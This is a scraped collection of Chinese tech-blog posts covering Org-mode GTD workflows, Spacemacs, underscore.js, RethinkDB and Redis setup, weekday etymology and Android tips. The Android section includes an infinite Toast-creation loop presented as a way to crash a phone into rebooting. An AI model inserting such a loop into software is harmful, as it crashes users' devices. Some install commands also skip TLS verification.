插件\n\n(add-to-list 'org-modules 'org-timer)\n\nC-c C-w refile 更改分类 （比如可以再gtd中实现移动到完成）\n\n状态关键词使用 +SEQTODO:\n类型关键词使用 #+TYPTODO\n\n创建表格\n|name|age|sex|\n|-\n常用快捷键\n g j 同级移动\n g k 同级移动\n g h 上级移动\n g l 下级移动\n\n 5.remember 收集工具\n\n Inbox,在 GTD 的定义里面是收集材料的工具。最好的 Inbox 工具是纸和笔。而 Remember 在 Org mode 里面算是较好的 Inbox 工具。它比每次打开 org 文件来写好非常非常多。\n\n 配置和基本使用remember.el在emacs23以上版本是自带的，emacs22及以下版本如果发现没有自带，请自行放狗搜。\n (setq org-default-notes-file \"~/.notes\")\n\n 在.emacs中作如上设置，表示你希望将remember产生的note存放在~/.notes中，要我说这可一点也不重要，重要的是下面这一行：\n (define-key global-map [f12] 'org-remember)\n\n stuck project 被卡住的项目\nA stuck project is a project that has no defined next actions, so it will never show up in the TODO lists Org mode produces. During the review, you need to identify such projects and define next actions for them.\n\njournal.org 个人备忘录 今天干了什么事情\nnotes.org 笔记 资料整理\ngtd.org\n收集箱 Inbox Remember org-capture [C-c c| SPC a o c]\n  日历Calendar 重复固定（生日 纪念日）\n  灵感inspiration: 我所说的是哪种突然出现，又害怕遗忘的一件事情。这件事情的来源可以是一个电话，可以是领导走过来交办的一件事情，当然也可以是头脑中突然闪现的一个念头\n\n!优先级 高、中、低\n  !!! 重要度\n  !!  紧急度\n@情境contexts  情景是用来减少切换成本的 @Call @home @office @way  \n\n\u0026标签 TAGS\n工作working 生活 学习Learning\n\n$目标 targets\n\n项目projects\n 多步骤的任务为项目\n\n 项目-核查清单(核验单)\n 项目-备忘录 Tickler File 记录对将来有帮助的项目[43个目录  12月 31日]\n\n^开始时间\n  日程表中安排的内容是必须在某天或某点执行的，如果这些任务刚好属于当天，就会出现在“今日待办”中\n  “今日待办”中空闲的那段时间去处理“下一步行动nextActions”中的任务\n  若是确定具体时间的任务，记录到自己的“今日待办”, “明日待办” , “日程agendas” 中；\n  “将来/也许“ Someday/MAYBE” 若是需要着手但没有确定具体时间的，则可将此任务放在“择日待办Someday”\n    将来/也许”的一层含义就是也许Maybe，可能做，也可能不做，还不确定。所以不用考虑太多，写下来就是了\n  等待waiting for 委托别人 [Follow 跟踪,追踪]\n\n%过滤\n  参考资料\n\n~归档archiving\n内部归档\n内部归档是在本文件内部给特定子树打上 ACHIVED 标签或者移动到名为 ACHIVED 的子树中去并打上标签。这个被认为是 ACIVED 的子树，会被移动了本级子树的最末端。\nC-c C-x a 将某一个节点打上ARCHIVE标签\nC-c C-x A 将当前节点归入一个名为Archive的子树中\n并且这个子树是位于当前级别子树的最下方\n\n外部归档\n外部归档是指把子树移动到另一个org文件中去。文件名可以自定义。默认情况下，归档的子树会被移动到名为“当年文件名_archived”的文件中去。\nC-c C-x C-s 把当前的节点移到archived文件中去。\n\n5.检查（Review） 回顾\n周期任务 [仪式（Ritual）]-- 是指每天都在重复的任务，比如早上出门前要记得关窗灌煤气，晚上睡觉前要做腹部运动等等，我通常也将每天的晚间回顾Evening Review放在这里面。\n\n Review\norg-Agenda [C-c a|]\n\n看板中的列展示了某项工作处于工作流中的什么状态. 一般可以分成三个状态todo, doing, done workflow. 当然你也可以自定义自己的工作流状态.\n\n我使用看板系统有一阵子了,我现在将工作流分成5个阶段: planning, in progress, blocked, review, done\n\n    planning - 待组织的工作.\n    in progress - 正在作的工作. 我尽可能的减少同时进行的工作以便能够快速的完成手头上的事情.\n    blocked - 已经开始作的工作,但由于某些原因目前无法完成.\n    review - 已经完成的工作. 但需要检查是否还有后续任务或需要总结.\n    done - 任务已经彻底结束了,可以放松一下了.\n\n  小贴士：\n  “今日待办”   “下一步行动”   “明日待办”   “日程agendas”\n  如果你的“日程”箱子内容及时更新、非常可靠，而且你的“下一步行动”箱子也及时更新，\n  那么你每天只要看这两样就行（在Doit.im中，因为“日程”中的任务到开始当天就会自动到“今日待办”，\n  因此你每天只要看“今日待办”和“下一步行动”就行了——若“今日待办”的内容足够你做一天，就连“下一步行动”也不用看了。）\n\n5、小贴士\n\n“下一步行动NEXT”必须是不用额外思考步骤就执行的：\n    正确：“美团查下周末有什么新电影，买票”\n    错误：“周末去看电影”\n\ncapture\nclarify\norganize\nreflect\nengage\n\n场景\n生活”“公司”“学习\"\n\nGTD中“下一步行动” VS “择日待办”的区别\n\n从意义上讲：\n\n“下一步行动/Next Actions”在英文版“Getting Things Done”中也叫“ASAP actions”，就是虽然没有具体时间规定，但要尽快去完成的任务；\n\n而“择日待办”就是那些你想到了可能以后要做，但不是那么重要（或者至少现在看来不是那么重要的），英文是Someday，就是说，“有朝一日”我要去做这个事情，所以GTD的作者曾说，你可以想想等你有钱了，你想干什么，然后把这个放到“择日待办”／“Someday”的箱子中。\n\n从处理整理的程度上讲：\n\n“下一步行动”都是已经经过处理、分析整理后，成为了具体可执行的那些任务；\n\n而“择日待办”的就不一定，很有可能你从收集箱你处理这个任务的时候，一看，哦，我“有朝一日”要这么做，但我现在还不去做它，那就不作分析细化了，直接扔到“择日待办”。然后，你每个礼拜都会去回顾查看一下这些任务（回顾过程我们在“回顾篇”文章中已经讲了），突然有一天，你决定要准备做这个事情了，那你再把它当成是刚从收集箱拿出来的一样，进行分析处理－组织整理（可能还因为它是多步骤任务都成了一个项目）。\n\n Org Mode GTD 常见问题\n\nQ：如何设置重复项目（例如习惯和重复的任务）？\n\n可以在时间戳内加如 +1d 、++1d/.+1d来使其可以每日循环，两者的差别是:+1d标记的事件如果有一天忘记做了，在agenda中依然会出现，而++1d/.+1d只会从你最后一次完成开始，之前没有做的都不再提示了。\n更多内容可以在下面的链接里面找到。\n\nhttp://orgmode.org/manual/Repeated-tasks.html12\n\nQ：如何设置 Inbox？\n\n在使用单一文件的情况下，可以用下面的层级来设置 Inbox。\n\nInbox\n TODO Task Number 01\n TODO Task Number 02\n\nQ：如何建立项目？\n\n单一文件可以用一个一级标题来做项目，再在其下做更多的代办事项即可。\n\nProjects\n Project Name 01\n TODO Task Number 01\n TODO Task Number 02\n\nQ：如何在当前事项下设置子事项（Sub-tasks）？\n\n根据上面的方法，我们可以用下面的方法为已存在的事项添加子事项。\n\nProjects\n Project Name 01\n TODO Task Number 01\n TODO Sub-task Number 01\n TODO Sub-task Number 02\n TODO Task Number 02\n\nQ：如何归档（Archive）已完成的事项？\n\norg-archive-subtree 可以用于归档意见完场的事项。快捷键是 C-c $。完成事项归档有钱拿，这样来记忆。\n\nQ：如何做每日、每周、每月的回顾？\n\n...\n\nQ：如何快速改变事项的分组？\n\nC-c C-w 可以通过 org-refile 来快速改变当前内容所属层级。\n\nQ：如何添加场景（Context）？\n\n场景可以使用标签（Tag）来代替，C-c C-c 用于设置标题栏的标签。\n\n更多关于标签的内容可以再后面找到 http://orgmode.org/manual/Tags.html。5\n\nQ：如何进行事项的搜索？\n\nC-c a s 接着输入事项关键字即可完成搜索。\n\nQ：如何在 Agenda 视图中标记事项已完成？\n\n在 Agenda 视图中使用 t 来对选中的事项进行完成状态的改变。或者使用 C-u t 来直接输入事项的状态。\n\nQ：如何快速打开 GTD 文件查看待办事项？\n\n使用下面的快捷键可以快速打开 GTD 全部待办事项。\n\n  (defun XYLayer/open-org-file()\n    \"Open ~/org/GTD.org file\"\n    (interactive)\n    (find-file \"~/org/GTD.org\"))\n\n  (global-set-key (kbd \"f12\") 'XYLayer/open-org-file)\n\nQ：如何改变事项的优先级？\n\n    S-up , org-priority-up\n    S-down, org-priority-down\n    C-c ,, org-priority\n\nGTD\n一、模板的清单系统\n\n清单系统其实来自于 GTD (搞定)一书中的“组织”环节。通过对 ToDo List 的梳理，把所有事情妥当整理在相应清单下。这些清单彼此可以快速转化，又有非常强烈的互斥性，对“三多”人群有非常大的帮助。这里简单介绍下我的三个清单列表：\n\n    下一步行动清单\n    等待清单\n    未来/也许清单\n\n1.下一步行动清单=动词+事件+关键人+截止日期\n决定下一步行动只要 10 秒。\n\n当面对一个比较大的项目时，不断拆分下一步行动可以更好的明确行动方式，不至于被一个巨大任务压倒。当然，我们不见得每个步骤都会写下来，但是在梳理的时候，必定会标记简单的 1、2、3 步骤，帮助我们把大项目切割成可执行的一小块，然后一步步执行下来。这样可以很快减少你的压力和焦虑，让你专注在下一步行动的执行中。\n\n比如“开网店”这个任务，如果就这样放在清单中，不仅难以下手造成拖延，而且每次打开清单都会看到，反而形成了压力。那么，拆解后，将下一步行动变成：“了解（动词）开网店（事件）的流程并且明天（截止日期）向其他店主（关键人）咨询”，你就可以迅速的去行动了。\n\n当你在滴答清单里把“下一步行动”一个个勾掉的时候，那种由内而发提升起来的自我价值感，就噗噗噗地在你小心脏里快速地跳跃，真是好有自豪感，有木有！\n\n2.等待清单=关键人+事件+截止日期+更早日期提醒\n“等待清单”的出现，就是把我们身上的猴子（比如项目/任务），快速处理后转移到其他人身上。放在“等待清单”的事情，不需要关心过程，只关心结果是不是想要的。\n\n当然，在大家的工作中，如果碰到一些有严重拖延症的同事，我建议设定一个“更早日期提醒”，这样可以帮助你了解目前任务的进度，并做到及时跟进。这样的做法，也帮助你及时跟相关领导报告任务卡顿在哪里，是否需要领导出面施压或是延长任务时间，而不是到最后 deadline 的时候，你没有时间整合处理，反而把猴子背在自己身上，产生巨大的压力和焦虑。\n\n比如“和笑笑去欧洲自由行”这个任务，当你把自己负责的行程确定好之后，就可以将任务转入“等待清单”，转化为“笑笑（关键人）预定好机票（事件），最迟11月25日要定好（截止日期）但是尽量10月25日前就预定（更早截止日期）”，这样处理之后，你就可以在 10 月 25 日询问笑笑机票的预订情况，确保不会买不到合适的机票导致旅游泡汤。\n\n在滴答清单中把一件事情处理完后，直接转入“等待清单”，能够更好地节约自己的时间成本。而且，当你看到自己的“下一步行动清单”已经清空，你就可以挥舞着小鞭子去督促其他人按时完成任务，那种感觉真是不要不要的！\n\n3.未来/也许清单=项目中产生+灵感创意+生活中触动\n我经常发现非常火的一些App（比如“饿了吗”）推出后，就会听到一些人说，“其实这个想法我也想到过，就是被他抢先啊，真是太后悔了有木有，否则现在已经到 D 轮融资，来自阿里巴巴的 12.5 亿美元，那就发达了。”\n\n其实我相信，这样的故事并不陌生，两者的区别在于，有些人在有创意的时候，放入了清单系统中，然后天时地利人和的时候，把事情给办了。但是另外一些人就是嘴巴上说两句，然后…就没有然后了。所以即使上帝给到他再多的灵感，他不能进行收集，并进行持续性孵化，也终将一事无成。\n\n我们日常生活中经常会有很多想法冒出来，把这些都放入清单，不时看看这些清单，是不是有哪些事情可以实现？\n二、个性化定制的清单系统\n\n进行自己的个性化定制，添加属于自己特有的清单列表，让你能够事半功倍地处理 ToDo List，从而走上时间管理的快车道。这里就是我跟大家分享我的三个个性化清单列表：\n\n    每天最重要的三件事\n    套路/常规\n    微习惯\n\n1.每天最重要的三件事=重要性+紧急性+影响力\n首先，时间管理不是帮助我们做更多的事情，而是让我们有足够多的空间去思考，去判断，去选择最重要的事情，然后把 80% 的时间、精力、金钱、能量对焦在最重要的三件事情上。\n\n什么是最重要的三件事呢？简单排序的话，就是重要性，紧急性和影响力。复杂一点，就是我们经常说 10000 小时的累积，如果你想要真正成为行业内的大咖，你就要经过10年的积累。\n\n比如我想要做培训师，就应该训练如下的能力：\n\n①快速学习能力，应对专业知识的快速迭代更新。\n②敏锐的观察力，有利于收集素材，挖掘培训需求，反馈学员议题。\n③一致性沟通能力，培训需求调查，学员互动反馈。\n④项目管理能力，每次培训都是一个小的项目，需要多方协作，共同呈现。\n……\n\n其实，我很喜欢滴答清单的一个原因是，我们可以单独建立一个清单，发到微信群中互动敦促。同时每周回顾的时候，当我打开「显示已完成」，可以直观的看到短期任务的重心是否围绕着中长期目标，从而不断淘汰无用和不重要的任务。\n\n2.套路/常规清单=固定时间+重复出现+模板制定\n每次我跟学员确定一对一教练信息的时候，对方就会很惊讶，为什么我可以这么快确定具体信息，里面包含时间、地点、交通、地图，其实这个就是我教练的“老地方”，这样的模板这就是我们说的套路/常规。\n\n在固定的时间（比如每天，每周，每月，每季度或是每年）重复出现，而且内容大同小异，那么就说明这些任务有固定模板可寻，只要调整部分细节就可以。\n\n我的清单系统中，有 100+ 个套路/常规，也就是说，将近 500+ 事情的处理，可以交托在系统里，不用思考，只要按部就班执行即可。同时，可以通过这个迷你套路/常规系统的建立，为以后建立整体的时间管理，知识管理等系统打下扎实的基础。\n\n如果你想要节省更多的时间，同时避免在自己“情绪大姨夫”来临的时候犯常识性错误，就赶紧在滴答清单中设定自己的日常性的套路吧，比如购物套路，阅读套路，睡觉套路等等。\n\n3.微习惯清单=每天做5分钟+重复设置\n当我们仔细查看的时候，会发现我们的一天是由一个个习惯堆积起来的，很多微习惯可能已经融入我们的骨血，不需要提醒，身体自带记忆，会自动化处理很多事情。\n\n有好的，当然也有坏的，比如拖延症，这就需要我们用一些好习惯去进行替代，而不是抹杀，面对这种情况，可以建立“微习惯清单”。同时滴答清单有「重复」设置，也就是你每天都可以看到完成情况。\n\n通过系统的建立，可以帮助大家更好地做好收集，真正做到“清空大脑，放入思考”。","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 spacemacs 如何自定义engine搜索","title":"spacemacs 如何自定义engine搜索","text":"spacemacs 如何自定义engine搜索\n\n方式1 .spacemacs\n\n(defun dotspacemacs/user-config ()\n\n  ;; 1. 定义搜索引擎\n  (defengine spotify \"https://play.spotify.com/search/%s\")\n  ;; 2. 添加搜索引擎\n  (add-to-list 'search-engine-alist\n          '(spotify\n          :name \"Spotify\"\n          :url \"https://play.spotify.com/search/%s\"))\n\n)\n 方式2 自定义layer中配置\nappleshan/my-spacemacs-config: My personal Spacemacs config\n\n(defun appleshan-programming/post-init-engine-mode ()\n  (add-to-list 'search-engine-alist\n    ;; elisp code search\n    '(Elisp\n         :name \"Elisp code search\"\n         :url \"http://www.google.com.au/search?q=%s+filetype:el\")\n    ;; javascript search on mozilla.org\n    '(Elisp\n         :name \"Javascript search on mozilla.org\"\n         :url \"http://www.google.com.au/search?q=%s+site:developer.mozilla.org\")\n    ))","tags":null},{"location":"//blog.pytool.com/Reship/2015-05-01-underscore","title":"underscore学习","text":"集合\n\nNote: Collection functions work on arrays, objects, and array-like objects such as arguments, NodeList and similar. But it works by duck-typing, so avoid passing objects with a numeric length property. It's also good to note that an each loop cannot be broken out of — to break, use _.find instead.\n\n遍历\neach\nmap\npluck\ninvoke\n查找\nfind\n\nwhere\nfindWhere\n\n过滤\nfilter\nreject\npartition\n判定\nevery\nsome\ncontains\n\n随机\nshuffle\nsample\n\n其它\n\nreduce\nreduceRight\nmax\nmin\nsize\n\nsortBy\ngroupBy\nindexBy\ncountBy\ntoArray\n\n数组\n\n去掉数组中部分元素\nwithout\ndifference\ncompact\nuniq\n返回指定位置元素\nfirst\ninitial\nlast\nrest\n多数组操作\nunion\nintersection\ndifference\nzip\nunzip\n数组转对象\nobject\n\n查找索引\nindexOf\nlastIndexOf\nsortedIndex\nfindIndex\nfindLastIndex\n\n创建数组\nrange\n其它\nflatten\n\n数组变对象\n\n对象\n获取属性\nkeys\nallKeys\nfindkey\nhas\n获取属性值\nvalues\nproperty\npropertyOf\n转换属性值\nmapObject\n键值对换\ninvert\n对象变数组\npairs\n获取对象所有方法\nfunctions\n\n扩展对象\nextend\nextendOwn\n精简对象\npick\nomit\n\n判断\nmatcher\nisEqual\nisMatch\nisEmpty\nisFinite\n\n判断数据类型\nisElement\nisArray\nisObject\nisArguments\nisFunction\nisString\nisNumber\nisBoolean\nisDate\nisRegExp\nisError\nisNaN\nisNull\nisUndefined\n\n其它\ndefaults\nclone\ntap","tags":null},{"location":"//blog.pytool.com/Post/数据库/2016-05-26 RethinkDB","title":"RethinkDB","text":"install\r\ndocker run -d -P --name rethink1 rethinkdb\r\n1. apt安装\r\nppa:rethinkdb/unstable\r\nsource /etc/lsb-release \u0026\u0026 echo \"deb http://download.rethinkdb.com/apt $DISTRIB_CODENAME main\" | sudo tee /etc/apt/sources.list.d/rethinkdb.list\r\nwget -qO- https://download.rethinkdb.com/apt/pubkey.gpg | sudo apt-key add -\r\nsudo apt-get update\r\nsudo apt-get install rethinkdb\r\n\r\n 2.源码安装\r\nsudo apt-get install build-essential protobuf-compiler python \\\r\n                     libprotobuf-dev libcurl4-openssl-dev \\\r\n                     libboost-all-dev libncurses5-dev \\\r\n                     libjemalloc-dev wget m4\r\nwget https://download.rethinkdb.com/dist/rethinkdb-latest.tgz\t\t\t\t\t\t\t\t\t\t \r\ntar xf rethinkdb-2.3.4.tgz\r\n./configure --allow-fetch\r\nmake \u0026\u0026 sudo make install\r\n`","tags":null},{"location":"//blog.pytool.com/Life/2016-03-23 英语技巧","title":"英语技巧","text":"I\nII\nIII\nIV\nV\nVI\nVII\nVIII\nIX\nX\nunus                1\nduo                 2\ntres                3\nquattuor            4\nquinque             5\nsex                 6\nseptem              7\nocto                8\nnovem               9\ndecem               10\n\nSunday（星期日）日尔曼民族和古罗马人一样，有时也用日月星辰来命名一星期中的某一天。作为一星期的第一天，Sunday在古时候是献给太阳的，古英语里拼作Sunnandaeg。犹太教的安息日定在星期六，基督教之所以改星期日为安息日，是因为耶稣在这一天复活。约从公元4世纪起，罗马天主教会就将Sunday定为假日，在这一天禁止任何人工作，教徒都得停止一切娱乐活动，上教堂去做礼拜。\n\nMonday（星期一）在古罗马神话中，月亮为太阳之妻。因此，在一星期中也必须有一天是献给月亮的。他们把一星期的第二天叫做Lunaedies，盎格鲁———撒克逊人借译了该词，作Monandaeg，意即Moon day，现代英语作Monday。\n\nTuesday（星期二）在北欧神话中，有一个战神名叫Tyr，相当于罗马神话里的 Mars。当狼精Fenrir在人间作恶时，Tyr自告奋勇前往擒拿，在绑缚狼精时，一只手被咬掉了。Tyr在古英语中拼作Tiw，从Tiw产生了古英语词Tiwesdaeg，意即the day of Tiw，这就是现代英语Tuesday的原始形式。\n\nWednesday（星期三）在古英语中原作 Modnesdaeg，意即Woden's day。Woden乃日尔曼战神Tyr之父，相当于罗马神话里的商业神Mercury。古罗马人以Mercury来命名星期三，把星期三叫做Mercurii dies。其实，英语Wodnesdaeg就是译自该拉丁词，只是在借译时Mercury换成了Woden而已。\n\nThursday（星期四）在北欧神话中，最有权势、最勇敢的神要数雷神Thor。他相当于罗马神话里的主神Jupiter ／Jove。当Thor驾着公山羊拉的战车奔驰而过时，天空顿时雷轰电闪。Thursday正是以Thor命名的，它在古英语原作Thuresdaeg，意即the day of Thor。\n\nFriday（星期五）在古英语中，Fri- day原作Frigedaeg，意即the day of Frigg ／Freya。Frigg ／Freya乃北欧爱情女神，亦即战神Woden之妻，由于沉溺于奢侈的生活而遭丈夫遗弃。该女神相当于罗马神话中的Venus，罗马人以Venus来命名星期五，称之为Dies Veneris，意即the day ofVenus，而英语借译该词时把Venus换成Frigg，作Frigedaeg。 Wednesday和Thursday是分别以Frigg ／Freya之夫Woden及其子Thor命名的，因此作为一种抚慰英语就把星期五献给了她。北欧人将星期五视为一周中最吉利的一天，是结婚日。对基督教徒来说，星期五则是不吉利的一天，因为耶稣正是在这一天被钉死在十字架上的。\n\nSaturday（星期六）Saturn乃罗马神话中的农神或播种之神。每年12月17日，古罗马人都要举行农神节（Saturnalia），纵情狂欢，他们还以农神的大名来命名一星期中最后一天，亦即the day of Saturn，英语Saturday即由此借译而来。\n\n为什么英语中会有如此多的拉丁语呢\n\n?\n\n语言史学家一般把英语历史分为三个时期\n\n,\n\n即古英\n\n语时期、\n\n中古英语时期和现代英语时期。\n\n不列颠群岛最早的居民是凯尔特人\n\n,\n\n又称不列颠人。\n\n公元前\n\n55\n\n年\n\n,\n\n罗马人在凯撒大帝的率领下侵入不列颠群岛\n\n,\n\n凯尔特人被罗马人驱赶至威尔士\n\n和苏格兰的深山中。直到公元\n\n410\n\n年\n\n,\n\n罗马占领时期才告结束。随后\n\n,\n\n来自德国北部平原的盎\n\n格鲁人、撒克逊人和朱特人三个日耳曼部落开始来到不列颠并定居下来。英语是盎格鲁\n\n2\n\n撒克逊人使用的语言。古英语时期由此开始。在这一时期发生了一个重要的历史事件\n\n,\n\n而且\n\n给英语词汇带来较大的影响\n\n,\n\n这就是基督教传入英国。\n\n公元\n\n597\n\n年\n\n,\n\n一个名叫奥古斯丁的牧师\n\n从罗马来到英国传教。罗马文化随着基督教传入了英国。与此同时\n\n,\n\n一大批拉丁词逐渐进入\n\n英语。\n\n1066\n\n年法国北部的诺曼人征服英格兰\n\n,\n\n直到\n\n1500\n\n年现代英语产生\n\n,\n\n这一长达五百年的\n\n时间即中古英语时期\n\n,\n\n此间大量的法语词汇进入英语。很多拉丁词汇先是被吸收为法语\n\n,\n\n然后\n\n再成为英语的。此时宗教的影响依然很大\n\n,\n\n拉丁语对英语的影响仍然很大\n\n,\n\n因为基督教使用的\n\n是拉丁语。\n\n在各个时期都有拉丁语的影响\n\n,\n\n因为拉丁语在欧洲各国的政界、\n\n宗教界、\n\n学术界、\n\n文学界都占有主导地位\n\n,\n\n英国要与这些国家交往就得使用拉丁语。英国的文法学校也教授拉\n\n丁语。对英国文学史稍有了解就会发现\n\n,\n\n早期的文豪们大多使用拉丁文写作。要想深入了解\n\n英语就得了解拉丁文\n\n,\n\n这种已经没有人再说的语言依然影响着英国人的生活。就像学习古代\n\n汉语有助于我们更好地掌握现代汉语\n\n,\n\n适当了解拉丁文\n\n,\n\n也会使我们学习英语受益匪浅","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-12 Android应用 Toast","title":"Android应用开发","text":"Toast定义为全局，避免一直不断的吐吐吐吐。\n\npublic class MToast {  \n    private static Toast mToast;  \n\n    private static TextView tvcontent;  \n\n    public static void showToast(Context context, String msg) {  \n        try {  \n\n            if (mToast == null) {  \n                mToast = Toast.makeText(context, msg, Toast.LENGTHSHORT);  \n                mToast.setGravity(Gravity.TOP, 0,  \n                        DensityUtil.dip2px(context, 3));  \n                View view = View.inflate(context, R.layout.mtoast, null);  \n                tvcontent = (TextView) view.findViewById(R.id.tvcontent);  \n                mToast.setView(view);  \n                tvcontent.setText(msg);  \n            } else {  \n                tvcontent.setText(msg);  \n            }  \n            mToast.show();  \n        } catch (Exception e) {  \n            // TODO: handle exception  \n        }  \n    }  \n}  \n\n标题栏样式抽取，抽取思路大概有两种，第一种：用inlcude标签在xml布局时引入，第二种：自定义一个TitleView，千万不要偷懒节省这个步骤。指不定那天产品就要让你改个样式，到时候你就哭吧。不仅仅是标题栏，字体大小，主题颜色，能抽取的都统一处理，产品的心和女人的新一样，说变就变。\n\nTextView.setText()；中要显示int类型的值，用String.valueOf()转，不要直接124+“”，不知道为什么这样的同学，基础太差，去看看源码就知道为什么了。\n\n退出应用方式，1.直接杀死进程 2.在BaseActivity中注册一个广播，发送广播关闭 3.定义一个全局容器存储Activity应用，退出时遍历退出（不推荐）\n\n一个功能分几个页面处理时，使用Dialog 模拟Activity 避免了数据在Activity之间传递。\n\n手机重启，知乎上看到滴，通过不断的new 空Toast，导致系统奔溃而重启，想想竟有一种无言以对的感觉，原来Toast还可以尼玛这么玩\n\npublic void onClick(View v){  \n       while(true){  \n            Toast toast = new Toast(this);  \n             toast.setView(new View(this));  \n             toast.show();  \n     }  \n\n}  \n\nView类中的setSelected(boolean)方法结合android:stateselected=\"\" 用来实现图片选中效果 自定义标题栏用起来很方便；\nEditText 中有个 android:digits=\"\" 属性，用来自定义输入的字符类型，比如输入身份证只能是数字和x或者X 使用 android:digits=\"1234567890xX\" 就轻松搞定了，不用再在代码里面进行蛋疼的校验了；","tags":null},{"location":"//blog.pytool.com/Post/数据库/2016-05-26 深入浅出Redis","title":"深入浅出Redis","text":"可视化工具 RedisDesktopManager\r\n支持: Windows 7+, Mac OS X 10.10+, Ubuntu 14+\r\n\r\n特点： C++ 编写，响应迅速，性能好。但不支持数据库备份与恢复。\r\n\r\n项目地址： https://github.com/uglide/RedisDesktopManager\r\n\r\nredis-desktop-manager\r\ncurl -Lkx 127.0.0.1:8087 https://github.com/uglide/RedisDesktopManager/releases/download/0.9.0-alpha3/redis-desktop-manager0.9.0.27amd64.deb -O\r\ndpkg -i redis-desktop-manager0.9.0.27amd64.deb\r\n\r\n    Download deb package from http://redisdesktop.com/download (Requires subscription)\r\n    Install package via Ubuntu Software Center\r\n    Run RedisDesktopManager : /usr/share/redis-desktop-manager/bin/rdm or redis-desktop-manager\r\n\r\n深入浅出Redis\r\n1.Redis的发展史\r\n\tRedis[Remote Directory Server]:远程服务器字典\r\n\r\n2.下载安装Redis\r\n\r\n\t1》Linux下安装Reids\r\n\thttp://redis.io/download\r\n\r\n\twget http://download.redis.io/releases/redis-3.0.1.tar.gz 下载\r\n\ttar -xzvf redis-3.0.1.tar.gz 解压\r\n\tcd redis-3.0.1 进入解压目录\r\n\tmake 编译 安装\r\n\tmake install\r\n\r\n\t2》在bin下可执行的程序\r\n\tredis-server:Redis服务器\r\n\tredis-cli:命令行客户端\r\n\tredis-benchmark:Redis的性能测试工具\r\n\tredis-check-aof:AOF文件修复工具\r\n\tredis-check-dump:RDB文件检测工具\r\n\r\n\tredis.conf是Redis的配置文件\r\n\t将配置文件中daemonize yes 以守护进程的方式来使用\r\n\r\n\t3》启动和停止Redis\r\n\r\n\t直接启动\r\n\t\tredis-server\r\n\t\tredis-server /etc/redis/redis.conf\r\n\t停止Redis\r\n\t\tshutdown\r\n\t\t结束Redis的进程也可以\r\nconfig set requirepass \"mypassword\" #启用密码\r\nvim /etc/redis/redis.conf\r\n\t#requirepass foobared\r\n\r\nsudo service redis restart\r\nredis-cli\r\nAUTH mypassword\r\nredis-cli -h host -p port -a \"password\"\r\n############\r\nCONFIG GET  \t\t\t\t\t\t获取配置\r\nKEYS  \t\t\t\t\t\t\t\t\t得到当前数据库中的存在的键名\r\nDEL\r\n\r\nTYPE\t\t\t\t\t\t\t\t\t\t返回key所存储的类型\r\nstring 类型 key-value\r\nSET name \"sona\"\r\nMSET name \"sona\" password \"123456\" \t\r\nget name\r\nmget name\r\n\r\nHash 类型 JSON\r\nhkeys\t\thkey      \t\t\t返回hash中key的所有的field\r\nhgetall hkey      \t\t\t返回hash表key中所有的field和value\r\nhget hkey field\r\nhmget hkey field field\r\nHSET hkey field value\r\nHMSET hkey field value field value\r\n\r\nlist 列表类型 队列\r\nLPUSH lkey value\r\nlrange lkey 0 -1\r\n\r\nset 集合类型\r\nSADD skey value\r\nsmembers skey\r\n\r\nzadd 有序集合类型\r\nZADD zkey 1 redis\r\nZADD zkey 2 mysql\r\nzrange zkey 0 10\r\n\r\n发布订阅\r\nSUBSCRIBE redisChat\r\nPUBLISH redisChat \"message\"\r\n\r\n################################################################################\r\n3.命令返回值\r\n\r\n\t1》状态回复\r\n\t\tping\r\n\r\n\t\tSET test 'this is a test'\r\n\t2》错误回复\r\n\r\n\t\t错误回复以error开始\r\n\t\t(error) ERR unknown command 'TESTERROR'\r\n\r\n\t3》整数回复:\r\n\r\n\t以interger 数值\r\n\t(integer) 2\r\n\r\n\t4》字符串回复\r\n\r\n\tGET test\r\n\r\n\t(nil)代表空的结果\r\n\r\n\t5》多行字符串回复\r\n\r\n\tKEYS  ,得到当前数据库中的存在的键名\r\n\r\n4.Redis配置选项相关内容\r\n\r\n\t1》动态设置/获取配置选项的值\r\n\r\n\t获取：\r\n\tCONFIG GET name\r\n\t1)\"port\"\r\n\t2)\"6379\"\r\n\r\n\t设置：\r\n\tCONFIG SET name value\r\n\r\n\t2》Redis配置文件redis.conf选项相关\r\n\r\n\t--连接选项--\r\n\r\n\tport 6379 默认端口\r\n\r\n\tbind 127.0.0.1，默认绑定的主机地址\r\n\r\n\ttimeout 0，当客户端闲置多久之后关闭连接，0代表没有启动这个选项\r\n\r\n\tloglevel notice，日志的记录级别\r\n\r\n\t# debug：很详细的信息，适合开发和测试\r\n\t# verbose ：包含很多不太有用的信息\r\n\t# notice ：比较适合生产环境\r\n\t# warning ：警告信息\r\n\r\n\tlogfile stdout，日志的记录方式，默认为标准输出\r\n\r\n\tdatabases 16，默认数据库的数量16个,默认的数据库编号从0开始\r\n\r\n\r\n\t--快照--\r\n\r\n\tsave seconds changes:多少秒有多少次改变将其同步到磁盘中数据文件里\r\n\tsave 900 1--900秒内有一个更改\r\n\tsave 300 10--300秒内有10个更改\r\n\tsave 60 10000--60秒内有10000个更改\r\n\r\n\r\n\trdbcompression yes，存储本地数据库时是否启用压缩，默认yes\r\n\r\n\tdbfilename dump.rdb，指定本地数据库文件名，默认为dump.rdb\r\n\r\n\tdir ./,指定本地数据库的存放目录，默认是当前目录\r\n\r\n5.Redis的数据类型\r\n\r\nString字符串类型 一个键最多存储512MB\r\n\t1》SET:设置key对应的值为value\r\n\r\n\t语法：SET key value [EX seconds] [PX milliseconds] [NX|XX]\r\n\tEX seconds:设置键的key的过期时间SET key value EX seconds -- SETEX\r\n\tPX milliseconds:以毫秒的形式设置过期时间SET key value PX milliseconds--PSETEX\r\n\tNX:只有键不存在的时候才可以设置成功SET key value NX--SETNX\r\n\tXX:只有key已经存在的时候才可以设置\r\n\r\n\tSET test16 'this is a test16' EX 100\r\n\tSET test17 'this is a test17' PX 20000\r\n\tSET test18 'this is a test18' NX\r\n\tSET test18 'this is a test18888' XX\r\n\r\n\tSET test19 'this is a test19' EX 100 NX\r\n\r\n\tSET test20 'this is a test20' EX 100 PX 300000 NX\r\n\r\n\tSET testStr1 'this is a test'\r\n\r\n\r\n\t注意：如果key存在，同名会产生覆盖\r\n\r\n\t2》GET：根据key找到对应的值\r\n\r\n\t语法：GET key\r\n\r\n\tGET 